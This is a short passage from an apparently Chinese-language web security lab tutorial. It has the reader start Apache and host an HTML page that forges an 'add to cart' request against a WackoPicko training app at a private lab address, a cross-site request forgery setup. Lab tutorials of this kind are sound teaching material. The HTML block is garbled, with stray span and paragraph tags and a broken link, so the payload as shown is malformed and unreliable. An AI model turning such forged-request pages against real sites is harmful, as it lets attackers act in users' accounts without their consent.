    服务器，如下：


    ```

    service apache2 start

    ```


    10. 然后，创建一个名为 `/var/www/html/wackopurchase.html` 的 HTML 文件，内容如下：


    ```html

    # Error 404: Not found

    [`192.168.56.102/WackoPicko/cart/action.</span> <span style=`](http://192.168.56.102/WackoPicko/cart/action.</</span>
    <span style=)php?action=add&picid=16"></</p> <p style="margin-left:3em"><span
